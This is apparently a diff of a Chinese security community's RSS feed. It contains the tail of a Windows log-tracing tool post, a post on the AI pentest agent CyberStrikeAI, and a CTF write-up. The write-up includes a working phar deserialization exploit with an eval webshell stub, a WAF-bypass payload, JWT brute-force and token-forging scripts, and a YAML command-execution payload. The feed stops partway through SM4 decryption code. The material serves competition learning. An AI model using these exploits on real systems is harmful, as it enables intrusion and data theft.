+&lt;ul&gt;&lt;li&gt;云沙箱、IP反查、威胁情报、空间测绘、网站备案、常见编码解码&lt;/li&gt;&lt;/ul&gt;
+
+&lt;p&gt;目前支持一键跳转，本来是计划做一个聚合类的导航栏，奈何go语言实现太麻烦，略微有点儿鸡肋性价比低就实现的跳转。&lt;/p&gt;
+
+&lt;h2&gt;DeepseekChatAI模块&lt;/h2&gt;
+
+&lt;ul&gt;&lt;li&gt;支持 Deepseek API 调用&lt;/li&gt;
+&lt;li&gt;上下文聊天、会话创建、清空、删除&lt;/li&gt;&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-11-13/1763027492-548181-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;在风险主机出网的条件下是支持使用ChatAI模块的，直接在Deepseek购买api量即可，总的来说完全够用。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-11-13/1763027558-235404-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;h2&gt;IP情报查询模块&lt;/h2&gt;
+
+&lt;ul&gt;&lt;li&gt;调用 VirtualTools API 查询IP&lt;/li&gt;
+&lt;li&gt;请求率: 每分钟4次，每日500次，每月15.5K次&lt;/li&gt;
+&lt;li&gt;红色标记已打标签IP&lt;/li&gt;&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-11-13/1763027632-621313-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;目前代码位置固定仅支持每分钟查询4个ip。&lt;/p&gt;
+
+&lt;h2&gt;截图模块&lt;/h2&gt;
+&lt;ul&gt;&lt;li&gt;点击“截图”按钮即可截取全屏&lt;/li&gt;
+&lt;li&gt;自动保存到当前目录下的 Screenshots 文件夹&lt;/li&gt;
+&lt;li&gt;支持多显示器同时截图&lt;/li&gt;
+&lt;li&gt;弹窗提示保存的截图数量和保存路径&lt;/li&gt;&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-11-13/1763027659-103768-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;h2&gt;使用方法&lt;/h2&gt;
+&lt;ol style=&quot;list-style-type:decimal&quot;&gt;&lt;li&gt;启动工具后选择日志类型&lt;/li&gt;
+&lt;li&gt;点击按钮执行提取，日志保存到本地数据库&lt;/li&gt;
+&lt;li&gt;分页浏览日志，点击查看详情&lt;/li&gt;
+&lt;li&gt;可通过筛选或时间选择缩小范围&lt;/li&gt;&lt;/ol&gt;
+
+&lt;h2&gt;注意事项&lt;/h2&gt;
+&lt;ul&gt;&lt;li&gt;必须以管理员权限运行&lt;/li&gt;
+&lt;li&gt;默认拉取最近7天日志，可自定义&lt;/li&gt;
+&lt;li&gt;首次运行会自动创建 log.db，config.json&lt;/li&gt;&lt;/ul&gt;
+
+&lt;h2&gt;工具使用效果&lt;/h2&gt;
+
+&lt;p&gt;目前在本机三层靶场测试效果还可以，基本上受控主机上测试效果还是可以的，基本上可以覆盖溯源攻击路径，不过该工具还是基于windows日志来实现的，前提是日志审核策略需要开启，目前基本上一般业务系统有做过等保和加固的常见的日志审核策略是满足需求的。并且AI的一键分析是基本上能够满足定位分析攻击路径的。&lt;/p&gt;
+
+</description><link>https://zone.huoxian.cn/d/3003-tools-windowswintracepro</link><guid isPermaLink="false">https://zone.huoxian.cn/d/3003-tools-windowswintracepro</guid><pubDate>Thu, 13 Nov 2025 10:01:35 GMT</pubDate><author>和</author><category>原创文章</category><category>应用安全</category><category>实战攻防</category></item><item><title>CyberStrikeAI：让安全测试像对话一样简单——智能渗透测试的技术实践</title><description>&lt;h1&gt;CyberStrikeAI：让安全测试像对话一样简单——智能渗透测试的技术实践&lt;/h1&gt;
+&lt;h2&gt;先附上开源工具链接：&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&quot;https://github.com/Ed1s0nZ/CyberStrikeAI&quot; rel=&quot;ugc noopener nofollow&quot; target=&quot;_blank&quot;&gt;https://github.com/Ed1s0nZ/CyberStrikeAI&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2&gt;从工具堆砌到智能调度：渗透测试的演进之路&lt;/h2&gt;
+
+&lt;p&gt;作为安全工程师，我们都经历过这样的场景：面对一个新的目标系统，我们需要在数十个安全工具之间不断切换，记忆各种复杂的命令行参数，手动分析海量的扫描结果，然后在不同的工具输出中寻找关联性。这种工作方式不仅效率低下，更严重的是，&lt;strong&gt;我们往往在工具的使用上花费了太多精力，反而减少了对安全威胁本质的思考时间&lt;/strong&gt;。&lt;/p&gt;
+
+&lt;h2&gt;技术人的解决方案：CyberStrikeAI的设计理念&lt;/h2&gt;
+
+&lt;p&gt;CyberStrikeAI不是要取代安全工程师，而是要成为工程师的智能助手。基于一个朴素但强大的想法：&lt;strong&gt;用技术手段解决技术问题，让AI处理重复性工作，让人专注于创造性分析&lt;/strong&gt;。&lt;/p&gt;
+&lt;h3&gt;效果&lt;/h3&gt;
+&lt;h4&gt;对话效果&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-11-09/1762662341-135326-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;br&gt;
+&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-11-09/1762662365-923119-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+&lt;h4&gt;MCP调用&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-11-09/1762662389-517788-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+&lt;h4&gt;调用链&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-11-09/1762662419-661041-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+
+
+
+&lt;h3&gt;核心架构：Golang + MCP协议的工程化实现&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;// 核心架构简示
+Agent Loop (AI决策引擎)
+    ↓
+MCP Server (工具调度中心)  
+    ↓
+Security Executor (命令执行层)
+    ↓
+98+ Security Tools (工具生态)&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;技术栈选择背后的思考&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Golang&lt;/strong&gt;：并发性能优异，跨平台编译方便，部署简单&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;MCP协议&lt;/strong&gt;：标准化工具调用，确保扩展性和兼容性&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;SQLite&lt;/strong&gt;：轻量级数据存储，适合单机部署场景&lt;/li&gt;&lt;/ul&gt;
+
+&lt;h3&gt;实际工作流程对比&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;传统方式&lt;/strong&gt;：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;# 1. 端口扫描
+nmap -sS -sV -O 192.168.1.0/24
+
+# 2. Web服务识别
+httpx -l targets.txt -title -status-code
+
+# 3. 漏洞扫描  
+nuclei -l targets.txt -t /nuclei-templates/
+
+# 4. 手动分析结果，决定下一步...&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;CyberStrikeAI方式&lt;/strong&gt;：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&quot;对192.168.1.0/24网段进行全面的安全评估，重点关注Web服务漏洞&quot;&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;系统自动完成：&lt;/p&gt;
+&lt;ol style=&quot;list-style-type:decimal&quot;&gt;&lt;li&gt;识别网络范围，调用nmap进行主机发现&lt;/li&gt;
+&lt;li&gt;对发现的Web服务调用httpx进行指纹识别&lt;/li&gt;
+&lt;li&gt;基于服务指纹选择相应的漏洞检测模板&lt;/li&gt;
+&lt;li&gt;自动分析结果，对可疑目标进行深度扫描&lt;/li&gt;
+&lt;li&gt;生成结构化报告，包括漏洞详情和修复建议&lt;/li&gt;&lt;/ol&gt;
+
+&lt;h2&gt;面向安全工程师的技术特性&lt;/h2&gt;
+
+&lt;h3&gt;工具集成：不重复造轮子&lt;/h3&gt;
+
+&lt;p&gt;我集成了98+个经过社区验证的安全工具，包括：&lt;/p&gt;
+&lt;ul&gt;&lt;li&gt;&lt;strong&gt;信息收集&lt;/strong&gt;：nmap, subfinder, amass, theharvester&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;漏洞扫描&lt;/strong&gt;：nuclei, sqlmap, xsser, dalfox  &lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Web安全&lt;/strong&gt;：dirb, gobuster, nikto, wafw00f&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;专项工具&lt;/strong&gt;：wpscan, jexboss, ysoserial&lt;/li&gt;&lt;/ul&gt;
+
+&lt;p&gt;每个工具都通过YAML配置文件进行标准化封装：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-yaml&quot;&gt;name: &quot;nmap&quot;
+command: &quot;nmap&quot;
+args: [&quot;-sT&quot;, &quot;-sV&quot;, &quot;-sC&quot;]
+description: &quot;网络扫描工具，用于发现网络主机、开放端口和服务&quot;
+
+parameters:
+  - name: &quot;target&quot;
+    type: &quot;string&quot;
+    description: &quot;目标IP地址或域名&quot;
+    required: true&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3&gt;智能决策：AI作为调度器&lt;/h3&gt;
+
+&lt;p&gt;AI在系统中的角色不是替代工具，而是&lt;strong&gt;智能调度器和结果分析器&lt;/strong&gt;：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;// AI决策流程
+1. 理解用户自然语言请求
+2. 分析目标特征和测试需求  
+3. 选择最适合的工具组合
+4. 动态调整参数优化扫描效果
+5. 解析工具输出，提取关键信息
+6. 基于发现决定后续测试路径&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3&gt;实时监控：掌握测试全过程&lt;/h3&gt;
+
+&lt;p&gt;系统提供完整的执行监控：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;# 查看工具执行状态
+GET /api/monitor
+
+# 实时查看漏洞统计
+{
+  &quot;total&quot;: 23,
+  &quot;severityCount&quot;: {
+    &quot;critical&quot;: 2,
+    &quot;high&quot;: 5, 
+    &quot;medium&quot;: 10,
+    &quot;low&quot;: 6
+  }
+}&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2&gt;实际应用场景分析&lt;/h2&gt;
+
+&lt;h3&gt;场景一：红队渗透测试&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;需求&lt;/strong&gt;：快速对目标企业进行外围渗透测试&lt;br&gt;
+&lt;strong&gt;传统方式&lt;/strong&gt;：手动信息收集 → 工具链执行 → 结果整理 (耗时：4-6小时)&lt;br&gt;
+&lt;strong&gt;CyberStrikeAI&lt;/strong&gt;：单次对话描述测试目标 → 自动执行完整流程 (耗时：30-60分钟)&lt;/p&gt;
+
+&lt;h3&gt;场景二：漏洞复现与验证&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;需求&lt;/strong&gt;：批量验证SRC提交的漏洞&lt;br&gt;
+&lt;strong&gt;传统方式&lt;/strong&gt;：逐个手动测试，重复性工作量大&lt;br&gt;
+&lt;strong&gt;CyberStrikeAI&lt;/strong&gt;：批量导入目标 → 自动匹配检测方案 → 生成验证报告&lt;/p&gt;
+
+&lt;h3&gt;场景三：安全巡检&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;需求&lt;/strong&gt;：定期对资产进行安全巡检&lt;br&gt;
+&lt;strong&gt;传统方式&lt;/strong&gt;：编写脚本，定时执行，人工分析&lt;br&gt;
+&lt;strong&gt;CyberStrikeAI&lt;/strong&gt;：配置巡检策略 → 自动执行 → 差异对比 → 告警通知&lt;/p&gt;
+
+&lt;h2&gt;扩展性与二次开发&lt;/h2&gt;
+
+&lt;h3&gt;自定义工具集成&lt;/h3&gt;
+&lt;p&gt;通过标准的YAML配置即可集成新工具：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-yaml&quot;&gt;name: &quot;custom-scanner&quot;
+command: &quot;python3&quot;
+args: [&quot;/tools/myscanner.py&quot;]
+parameters:
+  - name: &quot;target&quot;
+    type: &quot;string&quot;
+    required: true&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3&gt;API集成现有流程&lt;/h3&gt;
+&lt;p&gt;系统提供完整的REST API，可轻松集成到现有安全体系中：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;# 集成到自动化漏洞管理平台
+def trigger_scan(target, scan_type):
+    response = requests.post(
+        &#39;http://cyberstrike-ai:8080/api/agent-loop&#39;,
+        json={&#39;message&#39;: f&#39;{scan_type}扫描 {target}&#39;}
+    )
+    return process_results(response.json())&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2&gt;技术人的实践建议&lt;/h2&gt;
+
+&lt;h3&gt;部署方案&lt;/h3&gt;
+&lt;ul&gt;&lt;li&gt;&lt;strong&gt;开发测试&lt;/strong&gt;：本地Docker部署，快速验证&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;团队使用&lt;/strong&gt;：服务器部署，共享使用&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;集成环境&lt;/strong&gt;：API方式集成到现有安全平台&lt;/li&gt;&lt;/ul&gt;
+
+&lt;h3&gt;使用技巧&lt;/h3&gt;
+&lt;ol style=&quot;list-style-type:decimal&quot;&gt;&lt;li&gt;&lt;strong&gt;渐进式测试&lt;/strong&gt;：从基础扫描开始，逐步深入&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;结果验证&lt;/strong&gt;：AI发现的关键漏洞建议人工复核&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;工具补充&lt;/strong&gt;：根据实际需求扩展工具库&lt;/li&gt;&lt;/ol&gt;
+
+&lt;h2&gt;结语：技术赋能，专注价值&lt;/h2&gt;
+
+&lt;p&gt;CyberStrikeAI的本质是&lt;strong&gt;通过技术手段提升安全工程师的工作效率&lt;/strong&gt;，让我们从繁琐的工具操作中解放出来，更加专注于威胁分析、漏洞研究和防护策略等更有价值的工作。&lt;/p&gt;
+
+&lt;p&gt;在网络安全人才紧缺的今天，提升个体工程师的效率就是提升整个行业的安全水位。我相信，好的工具应该像得力的助手一样，默默处理繁琐工作，让专家专注于专业判断。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;项目地址&lt;/strong&gt;：&lt;a href=&quot;https://github.com/Ed1s0nZ/CyberStrikeAI&quot; rel=&quot;ugc noopener nofollow&quot; target=&quot;_blank&quot;&gt;https://github.com/Ed1s0nZ/CyberStrikeAI&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;让技术回归本质，让安全测试变得更加高效——这是CyberStrikeAI的技术追求，也是我对安全社区的诚意贡献。&lt;/p&gt;</description><link>https://zone.huoxian.cn/d/2999-cyberstrikeai</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2999-cyberstrikeai</guid><pubDate>Sun, 09 Nov 2025 04:42:37 GMT</pubDate><author>Ed1s0n</author><category>原创文章</category><category>tool</category><category>应用安全</category><category>实战攻防</category><category>github</category><category>tools</category><category>CTF</category><category>安全运营</category></item><item><title>2025湾区杯线网络安全大赛上赛Writeup(卡点发还是热乎的)</title><description>&lt;h2&gt;前言&lt;/h2&gt;
+
+&lt;p&gt;本来早都写好了，官方WP提交截止时间是昨晚九点半，懒得等了，今早发吧，整体题目还是比较有意思的。&lt;/p&gt;
+
+&lt;h2&gt;Ez_readfile&lt;/h2&gt;
+
+&lt;p&gt;php反序列化利用phar协议绕过waf写入webshell&lt;/p&gt;
+
+&lt;p&gt;析构函数中根据 &lt;code&gt;$mode&lt;/code&gt; 值做不同操作：&lt;/p&gt;
+
+&lt;ul&gt;&lt;li&gt;&lt;code&gt;&#39;w&#39;&lt;/code&gt;: 把 &lt;code&gt;$_POST[0]&lt;/code&gt; 写入一个随机 &lt;code&gt;.phar&lt;/code&gt; 文件（可能用于 PHAR 反序列化）。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&#39;r&#39;&lt;/code&gt;: &lt;code&gt;include($_POST[0])&lt;/code&gt; —— &lt;strong&gt;文件包含漏洞&lt;/strong&gt;&lt;/li&gt;&lt;/ul&gt;
+
+&lt;p&gt;构造利用链&lt;/p&gt;
+
+&lt;p&gt;需要绕过正则，常用协议无法使用，这里使用glob协议&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Nimbus` 被反序列化 → 析构时调用 `$this-&amp;gt;handle()`
+ → `$a-&amp;gt;handle` 是 `Nimbus` 实例 → 调用 `Nimbus::__invoke()&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;根据利用连构造EXP如下&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+class Coral { public $pivot; }
+class Nimbus { public $handle; public $ctor; }
+class Zephyr { public $target; public $payload; }
+
+@unlink(&quot;phar.phar&quot;);
+$a = new Nimbus();
+$a-&amp;gt;handle = new Nimbus();
+$a-&amp;gt;handle-&amp;gt;handle = new Zephyr();
+$a-&amp;gt;handle-&amp;gt;handle-&amp;gt;target = new Coral();
+$a-&amp;gt;handle-&amp;gt;handle-&amp;gt;target-&amp;gt;pivot = new Nimbus();
+$a-&amp;gt;handle-&amp;gt;handle-&amp;gt;target-&amp;gt;pivot-&amp;gt;ctor = &quot;DirectoryIterator&quot;;
+$a-&amp;gt;handle-&amp;gt;handle-&amp;gt;payload = &quot;glob:///*fl*&quot;;
+echo serialize($a);
+$phar = new Phar(&quot;phar.phar&quot;);
+$phar-&amp;gt;startBuffering();
+$phar-&amp;gt;setStub(&quot;&amp;lt;?php eval(\$_GET[1]); phpinfo(); __HALT_COMPILER(); ?&amp;gt;&quot;);
+$phar-&amp;gt;setMetadata($a);
+$phar-&amp;gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);
+$phar-&amp;gt;stopBuffering();
+?&amp;gt;&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;使用gz压缩绕过WAF&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;D:\phpstudy_pro\WWW&amp;gt;python 1.py
+%1F%8B%08%00%1Em%BEh%02%FF%B3%B1/%C8%28PH-K%CC%D1P%89ww%0D%896%8C%D5%B4V%00%8Ae%E6%A5%E5k%00%99%F1%F1%1E%8E%3E%21%F1%CE%FE%BE%01%9E%3E%AEA%20%21%7B%3B%5E.%1DF%06%06%20b%10d%80%D0%0C%0C%DF%80%D8%DF%CA%CCJ%C9/37%A9%B4X%C9%CA%C8%AA%BA%18%C4%CFH%CCK%C9IU%B2%26%2C%19%95Z%90QY%84%90%2CI%2CJO-%01I%9AZ%299%E7%17%25%E6%28Y%19%82%E4%80%DC%82%CC%B2%FC%12%02%86%FAY%17%5B%99X%29%25%97%E4%17%29%01%99%86%E6VJ.%99E%A9%20~%A5gIjQ%22X%A2%B6%B6%D8%0A%28S%90X%99%93%9F%98%02Vhd%A5%94%9E%93%9Fd%A5%AF%AF%AF%95%96%A3%05T%83d%90%1F%3A%8F%03%E8%F3%92%D4%E2%12%BD%92%8A%12%16%20%5B4w_%06%88%E6%A9%AB%BF%B1%0D%128%60%F9%03%ADO%96%AB%CChk%BDz3%3F%5D%ADrJ%FE%91%DE%2B%C6L%409w%27_%27%00%3C%AA%2BO%88%01%00%00&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;POST上传文件，出发phar反序列化&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-09-08/1757332493-534599-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;读取文件&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-09-08/1757332507-865902-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;尝试写入webshell，进行命令执行，&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-09-08/1757332518-909862-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;可以查看当前目录，发现存在backup的定时文件，创建软连接到backup目录下读取flag文件。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-09-08/1757332530-38201-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;h2&gt;EZ_python&lt;/h2&gt;
+
+&lt;p&gt;考察点：JWT伪造爆破&lt;/p&gt;
+
+&lt;p&gt;              yaml文件正则过waf文件上传进行命令执行&lt;/p&gt;
+
+&lt;p&gt;任意伪造jwt会报错密钥前缀，构造py爆破密钥&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# brute_jwt.py
+import jwt
+import string
+import itertools
+
+# 你的 JWT
+jwt_token = &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6InVzZXIifQ.karYCKLm5IhtINWMSZkSe1nYvrhyg5TgsrEm7VR1D0E&quot;
+
+# 密钥前缀（直接写 %）
+secret_prefix = &quot;@o70xO$0%#qR9#&quot;
+
+# 字符集
+charset = string.ascii_letters + string.digits  # a-z, A-Z, 0-9
+
+print(&quot;🚀 开始爆破密钥...&quot;)
+
+for suffix in itertools.product(charset, repeat=2):
+    secret = secret_prefix + &#39;&#39;.join(suffix)
+    try:
+        # 尝试解码
+        decoded = jwt.decode(jwt_token, secret, algorithms=[&#39;HS256&#39;])
+        print(f&quot;\n✅ 成功！密钥为：{secret}&quot;)
+        print(f&quot;Payload: {decoded}&quot;)
+        break
+    except jwt.InvalidTokenError:
+        continue
+else:
+    print(&quot;❌ 未找到密钥&quot;)&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;获取到密钥构造admin权限的token进行文件上传&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# sign_admin.py
+import jwt
+
+# 已知信息
+secret = &quot;@o70xO$0%#qR9#m0&quot;  # 原始密钥（直接写 %）
+old_jwt = &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6InVzZXIifQ.karYCKLm5IhtINWMSZkSe1nYvrhyg5TgsrEm7VR1D0E&quot;
+
+# 新的 payload
+new_payload = {
+    &quot;username&quot;: &quot;admin&quot;,
+    &quot;role&quot;: &quot;admin&quot;
+}
+
+# 使用 HS256 算法重新签名
+new_token = jwt.encode(new_payload, secret, algorithm=&#39;HS256&#39;)
+
+print(&quot;✅ 成功生成 admin JWT：&quot;)
+print(new_token)&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;获取到正确的token上传&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-09-08/1757332637-670259-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;文件上传的时候报错&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-09-08/1757332648-907939-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;只有内容为python的内容才能直接运行，回显为run，猜测后端代码使用method=python，前端依旧可以上传yaml文件，构造脚本常看回显，先使用ls -l查看当前路径下的文件，在读取f111ag&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# send_yaml.py
+
+import requests
+
+url = &quot;http://web-d4c6da270e.challenge.xctf.org.cn/sandbox&quot;
+headers = {
+    &quot;Authorization&quot;: &quot;Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.-Ws9e4GwaL0hesqjmSuOKNmyximBStder-7VnXK0w70&quot;
+}
+
+# 上传 YAML 文件
+
+files = {
+    &#39;codefile&#39;: (&#39;exploit.yaml&#39;, &#39;&#39;&#39;
+run: !!python/object/apply:subprocess.getoutput
+
+  - cat /f1111ag*
+    &#39;&#39;&#39;, &#39;text/yaml&#39;),
+    &#39;mode&#39;: (None, &#39;yaml&#39;)  # 注意：mode 可能是 &#39;yaml&#39; 或 &#39;yml&#39;
+    }
+
+r = requests.post(url, files=files, headers=headers)
+print(&quot;📡 状态码:&quot;, r.status_code)
+print(&quot;📜 响应内容:&quot;)
+print(r.text)&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-09-08/1757332663-169421-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;h2&gt;SilentMiner&lt;/h2&gt;
+
+&lt;h3&gt;攻击者IP &lt;code&gt;auth.log&lt;/code&gt;下攻击者进行ssh爆破&lt;/h3&gt;
+
+&lt;blockquote class=&quot;uncited&quot;&gt;&lt;div&gt;&lt;p&gt;192.168.145.131&lt;/p&gt;&lt;/div&gt;&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-09-08/1757332737-786149-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;h3&gt;攻击者共进行多少次ssh口令爆破失败?&lt;/h3&gt;
+
+&lt;p&gt;实际上搜索出的是257次，实际上答案是258，我说咋一直不对，最后随手改的竟然提交对了，这个应该是答案错了&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-09-08/1757332755-600603-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;h3&gt;后门文件路径的绝对路径是什么?&lt;/h3&gt;
+
+&lt;p&gt;sshd文件被修改并且重启了ssh服务&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-09-08/1757332807-775750-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;h2&gt;攻击者用户分发恶意文件的域名是什么？&lt;code&gt;(注意系统时区)&lt;/code&gt;&lt;/h2&gt;
+
+&lt;p&gt;/bar/log/dnsmasq.log中的dns域名进行检索，最终确定为&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-09-08/1757332819-529412-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-09-08/1757333101-28452-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;h3&gt;挖矿病毒所属的家族是什么？&lt;/h3&gt;
+
+&lt;p&gt;通过恢复恢复tmp目录下文件进行解密找到加密的病毒家族kinsing&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-09-08/1757332834-222218-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;h2&gt;CheckWebshell&lt;/h2&gt;
+&lt;p&gt;流量分析比较简单，语法搜索字符串找到&lt;code&gt;flag.txt&lt;/code&gt;&lt;br&gt;
+&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-09-08/1757332971-895186-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;返回包是内容，发现flag为sm4的国密算法求解得到flag&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+class SM4 {
+    const ENCRYPT = 1;
+    private $sk; 
+    private static $FK = [0xA3B1BAC6, 0x56AA3350, 0x677D9197, 0xB27022DC];
+    private static $CK = [
+        0x00070E15, 0x1C232A31, 0x383F464D, 0x545B6269,
+        0x70777E85, 0x8C939AA1, 0xA8AFB6BD, 0xC4CBD2D9,
+        0xE0E7EEF5, 0xFC030A11, 0x181F262D, 0x343B4249,
+        0x50575E65, 0x6C737A81, 0x888F969D, 0xA4ABB2B9,
+        0xC0C7CED5, 0xDCE3EAF1, 0xF8FF060D, 0x141B2229,
+        0x30373E45, 0x4C535A61, 0x686F767D, 0x848B9299,
